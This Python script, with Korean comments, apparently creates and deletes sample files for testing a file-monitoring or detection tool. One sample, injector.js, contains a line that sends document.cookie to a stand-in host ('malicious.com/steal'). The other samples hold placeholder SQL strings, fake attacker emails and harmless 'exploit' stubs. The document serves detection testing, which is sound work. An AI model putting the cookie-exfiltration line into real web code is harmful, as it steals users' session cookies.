## 현재 실행중인 코드의 위치를 기반으로 모니터링할 디렉터리와 test 파일들 생성
## 모니터링 테스트를 위한 파일 생성 코드
## 1 - 생성
## 2 - 삭제


import os

# 현재 파일 기준 경로 설정
current_dir = os.path.dirname(os.path.abspath(__file__))
monitor_dir = os.path.join(current_dir, "monitor_directory")

# 생성할 파일 목록
test_files = {
    "test_malicious.py": """# 공격자 이메일
# hacker@example.com

query = "SELECT * FROM admin WHERE id = 1 --"
import os
os.system("echo 위험한 시스템 명령어 실행됨")
""",
    "injector.js": """// Email: attacker@evil.com
let sql = "INSERT INTO users VALUES ('admin', 'password')";
fetch("http://malicious.com/steal?cookie=" + document.cookie);
""",
    "Exploit.class": """/*
Multi-line comment with email: exploit@mal.net
*/
public class Exploit {
    public static void main(String[] args) {
        System.out.println("Exploit 실행 시뮬레이션");
        String sql = "DELETE FROM users WHERE id = 1";
    }
}
""",
    "innocent.txt": """이 파일은 정상적인 텍스트 파일입니다.
이메일 주소나 SQL문은 포함되어 있지 않습니다.
"""
}


def create_files():
    os.makedirs(monitor_dir, exist_ok=True)
    for filename, content in test_files.items():
        file_path = os.path.join(monitor_dir, filename)
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"{filename} 생성 완료")
    print("\n모든 테스트 파일 생성 완료.")


def delete_files():
    if not os.path.exists(monitor_dir):
        print("monitor_directory 디렉터리가 존재하지 않습니다.")
        return

    deleted = False
    for filename in test_files.keys():
        file_path = os.path.join(monitor_dir, filename)
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"{filename} 삭제 완료")
            deleted = True

    if not deleted:
        print("삭제할 테스트 파일이 없습니다.")
    else:
        print("\n🧹 모든 테스트 파일 삭제 완료.")


if __name__ == "__main__":
    while True:
        print("monitor_directory 테스트 파일 관리")
        print("1. 테스트 파일 생성")
        print("2. 테스트 파일 삭제")
        print("0. 종료")
        choice = input("선택 (1/2/0): ").strip()

        if choice == "1":
            create_files()
        elif choice == "2":
            delete_files()
        elif choice == "0":
            print("종료합니다.")
            break
        else:
            print("잘못된 입력입니다.")
